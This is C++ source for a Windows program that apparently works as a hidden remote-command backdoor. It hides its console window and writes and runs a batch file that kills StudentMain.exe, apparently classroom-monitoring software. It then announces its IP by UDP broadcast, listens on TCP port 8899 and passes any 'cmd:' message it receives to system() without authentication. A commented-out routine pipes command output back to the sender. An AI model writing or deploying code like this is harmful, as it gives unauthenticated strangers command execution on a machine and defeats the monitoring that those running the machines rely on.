#include <iostream>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <typeinfo>
#include <thread>
#include <fstream>
#define BUFFER 1024

#pragma comment(lib,"WS2_32.lib")
using namespace std;

const char* CMD_EXIT="exit";
const char* CMD_CMD="cmd";

WSADATA data;
SOCKET s,tcp,client;
SOCKADDR_IN server,cli;
bool waiting=true;
char n[1000005];
char buf[BUFFER];
/*void cmdMode() {
	int leng;
	while (true) {
		fill(buf,buf+strlen(buf),'\0');
		recv(client,buf,BUFFER-1,0);
		leng=strlen(buf);
		if (leng==0) {
			closesocket(tcp);
			waiting=true;
			return;
		}
		if (buf[0]==':'&&buf[1]==':')
			return;
		char reader[128];
		FILE* pipe = _popen(buf, "r");
		if (!pipe) continue;
		if (!feof(pipe))
			if (fgets(reader,128,pipe)) send(client,reader,1,0);
		_pclose(pipe);
	}
}*/
void waitTCP() {
	tcp=socket(AF_INET,SOCK_STREAM,0);
	bool rr=true;
	setsockopt(tcp, SOL_SOCKET, SO_REUSEADDR, (char*)&rr, sizeof(BOOL));
	if (tcp==INVALID_SOCKET) {
		cout<<"Socket created failed, ErrorCode:"<<WSAGetLastError();
		WSACleanup();
		exit(1); 
	}
	server.sin_addr.S_un.S_addr = INADDR_ANY;
	server.sin_family = AF_INET;
	server.sin_port = htons(8899);
	bind(tcp,(SOCKADDR*)&server,sizeof(SOCKADDR));
	listen(tcp,1);
	int len=sizeof(SOCKADDR);
	client=accept(tcp,(SOCKADDR*)&server,&len);
	printf("Connected\n");
	waiting=false;
	int leng,find; 
	while (true) {
		fill(buf,buf+strlen(buf),'\0');
		recv(client,buf,BUFFER-1,0);
		leng=strlen(buf);
		if (leng==0) {
			closesocket(tcp);
			waiting=true;
			return;
		}
		for (find=0;find<=leng;find++) if (buf[find]==':') break;
		fill(n,n+find,'\0');
		for (int i=0;i<find;i++) n[i]=buf[i];
		n[find]='\0';
		if (strcmp(n,CMD_EXIT)==0) {
			closesocket(tcp);
			waiting=true;
			return;
		} else if (strcmp(n,CMD_CMD)==0) {
			for (int i=0;i<leng-find-1;i++) n[i]=buf[find+i+1];
			n[leng-find-1]='\0';
			printf("Leng:%d,Find:%d,buf:\"%s\",n:\"%s\"\n",leng,find,buf,n);
			system(n);
			fill(n,n+strlen(n),'\0');
			continue;
		}
	}
}
void doOne() {
	system("cls");
	cout<<"Wait for Connection"<<endl;
	int ret;
	s = socket(AF_INET,SOCK_DGRAM,0);
	bool broad=true;
	setsockopt(s, SOL_SOCKET, SO_BROADCAST, (char*)&broad, sizeof(BOOL));
	if (s==INVALID_SOCKET) {
		cout<<"Socket created failed, ErrorCode:"<<WSAGetLastError();
		WSACleanup();
		exit(1);
	}
	SOCKADDR_IN sin;
	int len=sizeof(SOCKADDR);
	ZeroMemory(buf,BUFFER);
	sin.sin_addr.S_un.S_addr = INADDR_BROADCAST;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(8898);
	char local[256];
	if (gethostname(local, sizeof(local))==SOCKET_ERROR) {
		cout<<"Get ip error\n";
		exit(1);
	}
	HOSTENT* host=gethostbyname(local);
	if (host==NULL) {
		cout<<"Cannot get host ip"<<endl;
		exit(1);
	}
	in_addr addr;
	memcpy(&addr, host->h_addr_list[0], sizeof(in_addr));
	char* c=inet_ntoa(addr);
	thread t(waitTCP);
	t.detach();
	while (waiting) {
		sendto(s, c, strlen(c), 0, (sockaddr*)&sin, sizeof(sin));
		Sleep(500);
	}
	closesocket(s);
	while (!waiting) {}
}

int main() {
	ShowWindow(GetForegroundWindow(),false);
	ofstream bat;
	bat.open("C:\\A.bat");
	bat<<"ntsd -c q -pn StudentMain.exe"<<endl<<"exit"<<endl;
	bat.close();
	system("start C:\\A.bat");
	if (WSAStartup(MAKEWORD(2,2),&data)!=0) {
		cout<<"Start failed\n";
		exit(1);
	}
	while (true) doOne();
	return 0;
}
